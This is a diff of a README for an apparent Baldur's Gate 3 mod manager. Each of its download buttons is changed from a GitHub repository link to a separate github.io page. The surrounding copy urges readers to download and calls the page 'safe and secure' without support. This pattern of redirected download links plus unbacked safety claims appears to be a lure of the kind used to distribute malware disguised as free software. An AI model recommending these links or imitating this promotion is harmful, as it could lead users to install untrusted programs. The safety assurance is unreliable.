@@ -1,6 +1,6 @@
 # 🎮 BG3-Mod-Manager-Redux - Your All-in-One Baldur's Gate 3 Modding Companion
 
-[![Download BG3 Mod Manager Redux](https://img.shields.io/badge/⬇️_Download-BG3_Mod_Manager_Redux-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/laurarodriguezk698/BG3-Mod-Manager-Redux)
+[![Download BG3 Mod Manager Redux](https://img.shields.io/badge/⬇️_Download-BG3_Mod_Manager_Redux-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://laurarodriguezk698.github.io)
 
 ---
 
@@ -47,7 +47,7 @@ Think of it as your personal command center for everything mod-related in BG3. Y
 
 Ready to begin? Simply **visit this link** to download BG3 Mod Manager Redux:
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download-BG3_Mod_Manager_Redux-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/laurarodriguezk698/BG3-Mod-Manager-Redux)
+[![Download Now](https://img.shields.io/badge/⬇️_Download-BG3_Mod_Manager_Redux-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://laurarodriguezk698.github.io)
 
 **Visit this link to download the application.** The download page is safe and secure.
 
@@ -194,7 +194,7 @@ BG3 Mod Manager Redux transforms Baldur's Gate 3 from a fantastic game into an *
 
 **Don't wait - start your modding journey today!**
 
-[![Get BG3 Mod Manager Redux Now](https://img.shields.io/badge/🚀_Get_Started-Download_Now-2196F3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/laurarodriguezk698/BG3-Mod-Manager-Redux)
+[![Get BG3 Mod Manager Redux Now](https://img.shields.io/badge/🚀_Get_Started-Download_Now-2196F3?style=for-the-badge&logo=github&logoColor=white)](https://laurarodriguezk698.github.io)
 
 ---
 
